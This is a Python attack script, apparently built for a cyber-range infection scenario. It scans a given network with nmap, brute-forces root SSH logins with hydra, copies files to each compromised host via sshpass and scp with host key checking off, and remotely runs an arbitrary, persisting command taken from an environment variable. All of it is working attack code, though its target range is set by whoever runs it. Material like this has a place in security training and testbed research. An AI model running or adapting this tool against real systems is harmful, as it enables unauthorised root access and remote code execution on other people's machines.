import subprocess
import os
import re

import argparse

def run_command(cmd, check=True):
  """Run a shell command and return the output."""
  print(f"[+] Running: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
  result = subprocess.run(cmd, capture_output=True, text=True)
  if check and result.returncode != 0:
    print(f"[-] Command failed: {result.stderr}")
    return None
  return result.stdout.strip() if result.stdout else None

def discover_hosts(cidr):
  """Discover live hosts in the given CIDR range using nmap."""
  print(f"[+] Discovering live hosts in {cidr}...")
  # Use nmap ping scan to discover live hosts
  nmap_result = run_command(['nmap', '-sn', cidr], check=False)
  if not nmap_result:
    print("[-] nmap discovery failed or no hosts found")
    return []
  
  # Parse nmap output to extract live hosts
  # nmap outputs lines like: "Nmap scan report for 192.168.1.1"
  # Host is up, indicating it's live
  live_hosts = []
  current_host = None
  for line in nmap_result.split('\n'):
    if 'Nmap scan report for' in line:
      current_host = line.split('for')[-1].strip()
    elif 'Host is up' in line and current_host:
      # Make sure it's not marked as down
      if 'down' not in line.lower():
        live_hosts.append(current_host)
      current_host = None
  
  print(f"[+] Found {len(live_hosts)} live hosts: {live_hosts}")
  return live_hosts

def main():
  # Load argparse
  parser = argparse.ArgumentParser(description='Infection scenario attacker - dynamically scan and attack target networks')
  
  # Support for --target argument and TARGET_NETWORK environment variable
  parser.add_argument('--target', type=str, help='Target network in CIDR notation (e.g., 192.168.1.0/24)')
  parser.add_argument("--skip_hydra", action="store_true", help="Skip hydra and just copy the FLAG file")

  args = parser.parse_args()

  skip_hydra = args.skip_hydra

  # Set the log file name
  log_hydra_fname = 'log_hydra.txt'

  # Get target network from CLI argument or environment variable
  target_network = args.target or os.environ.get('TARGET_NETWORK', '')
  
  if not target_network:
    # Fallback: try to get from MENTORED_IP_LIST.json if it exists
    print("[-] No target network specified via --target or TARGET_NETWORK env var")
    if os.path.exists('/MENTORED_IP_LIST.json'):
      print("[+] Falling back to MENTORED_IP_LIST.json")
      import json
      with open('/MENTORED_IP_LIST.json', 'r') as f:
        IP_LIST_DATA = json.load(f)
      
      exp_iface = os.environ.get('MENTORED_EXP_IFNAME', 'net1')
      vulnerable_ips = []
      for nodeactor_name, nodeactor_data in IP_LIST_DATA.items():
        for pod in nodeactor_data:
          # find the ip address related to exp_iface
          is_exp_iface = [x[2]==exp_iface for x in pod]
          if any(is_exp_iface):
            idx = is_exp_iface.index(True)
            ip = pod[idx][0]
            vulnerable_ips.append(ip)
      
      vulnerable_ips_list = vulnerable_ips
      print(f"[+] Found {len(vulnerable_ips_list)} IPs from MENTORED_IP_LIST.json")
    else:
      print("[-] No target network specified and no MENTORED_IP_LIST.json found. Exiting.")
      return
  else:
    # Discover live hosts in the target CIDR range
    vulnerable_ips_list = discover_hosts(target_network)
    if not vulnerable_ips_list:
      print("[-] No live hosts found. Exiting.")
      return

  print(f"[+] Target IPs: {vulnerable_ips_list}")

  # Load PASSW_LIST from env
  if 'PASSW_LIST' in os.environ:
    password_list = os.environ['PASSW_LIST']
  else:
    password_list = '10000_common_passwords'

  if "ATTACK_CMD" in os.environ:
    command = os.environ["ATTACK_CMD"]
  else:
    command = 'touch /FLAG'

  # Command should keep alive even after the script is finished
  file_attack_content = f'#!/bin/bash\n\n'
  file_attack_content += f'{command} &\n'
  file_attack_content += f'disown %1\n'

  with open('file_attack_cmd.sh', 'w') as file_attack:
    file_attack.write(file_attack_content)

  subprocesses = []

  found_pwd = {}
  for target_ip in vulnerable_ips_list:
    if not skip_hydra:
      print(f'Starting hydra for {target_ip}')
      # Run hydra and redirect output to the log file
      with open(log_hydra_fname, 'w') as log_file:
        subprocess.run(['hydra', '-l', 'root', '-P', password_list, '-s', '22', '-f', target_ip, 'ssh'], 
              stdout=log_file, stderr=subprocess.STDOUT)

      print(f'Finished hydra for {target_ip}')

    # Check for errors in the log file
    with open(log_hydra_fname, 'r') as log_file:
      log_contents = log_file.read()
      if 'ERROR' not in log_contents:
        print(f'No errors in {log_hydra_fname}')

        # Extract password from the log file
        ssh_password = None
        for line in log_contents.splitlines():
          if 'password:' in line:
            ssh_password = line.split('password:')[1].strip()
            break

        if ssh_password:
          # Write the password to a file called FLAG
          with open('FLAG', 'w') as flag_file:
            flag_file.write(ssh_password)

          print(f'Found password for {target_ip}: {ssh_password}') 
          found_pwd[target_ip] = ssh_password

          # Use sshpass to copy the FLAG file to the target server
          subprocess.run([
            'sshpass',
            '-p',
            ssh_password,
            'scp',
            '-o',
            'StrictHostKeyChecking=no',
            'FLAG',
            f'root@{target_ip}:/FLAG'])

          subprocess.run([
            'sshpass',
            '-p',
            ssh_password,
            'scp',
            '-o',
            'StrictHostKeyChecking=no',
            'file_attack_cmd.sh',
            f'root@{target_ip}:/file_attack_cmd.sh'])

  for target_ip, ssh_password in found_pwd.items():
          subprocesses.append(subprocess.Popen([
              'sshpass',
              '-p',
              ssh_password,
              'ssh',
              '-o',
              'StrictHostKeyChecking=no',
              f'root@{target_ip}',
              "bash /file_attack_cmd.sh"],
              stdout=subprocess.PIPE,
              stderr=subprocess.STDOUT,
              stdin=subprocess.DEVNULL))

  # Wait for all subprocesses to finish
  for ip, process in zip(found_pwd.keys(), subprocesses):
    print(f"Waiting for process in {ip} to finish")
    process.wait()

  print("All processes finished")

if __name__ == '__main__':
  main()
